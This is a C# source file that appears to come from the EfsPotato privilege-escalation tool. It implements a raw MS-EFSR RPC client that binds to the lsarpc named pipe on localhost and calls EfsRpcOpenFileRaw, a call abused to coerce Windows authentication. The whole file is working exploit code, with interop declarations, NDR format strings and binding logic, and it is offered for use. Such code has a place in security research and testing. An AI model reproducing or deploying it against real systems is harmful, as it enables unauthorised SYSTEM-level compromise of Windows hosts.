using System;
using System.Runtime.InteropServices;


namespace EfsPotato
{
    //this code just copy-paste from gist
    //orig class: rprn
    //some changed for MS-EFSR
    class EfsrTiny
    {
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFree(ref IntPtr lpString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, out IntPtr hContext, string FileName, int Flags);

        private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x04, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x00 };

        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x08, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x00 };

        private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };

        private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
        Guid interfaceId;
        public EfsrTiny()
        {
            interfaceId = new Guid("c681d488-d850-11d0-8c52-00c04fd90f7e");
            if (IntPtr.Size == 8)
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\lsarpc", 1, 0);
            }
            else
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\lsarpc", 1, 0);
            }
        }

        ~EfsrTiny()
        {
            freeStub();
        }
        public int EfsRpcOpenFileRaw(out IntPtr hContext, string FileName, int Flags)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

            hContext = IntPtr.Zero;
            try
            {
                if (IntPtr.Size == 8)
                {
                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), out hContext, FileName, Flags);
                }
                else
                {
                    IntPtr tempValue = IntPtr.Zero;
                    GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                    IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                    try
                    {
                        result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), tempValuePointer, pfn, IntPtr.Zero);
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        hContext = Marshal.ReadIntPtr(tempValuePointer);
                    }
                    finally
                    {
                        handle.Free();
                    }
                }
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Console.WriteLine("[x] EfsRpcOpenFileRaw failed: " + err);
                return err;
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }


        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);

        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        delegate void freememory(IntPtr memory);

        protected static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }


        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Console.WriteLine("[!] binding ok (handle=" + binding.ToString("x") + ")");
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
    }
}
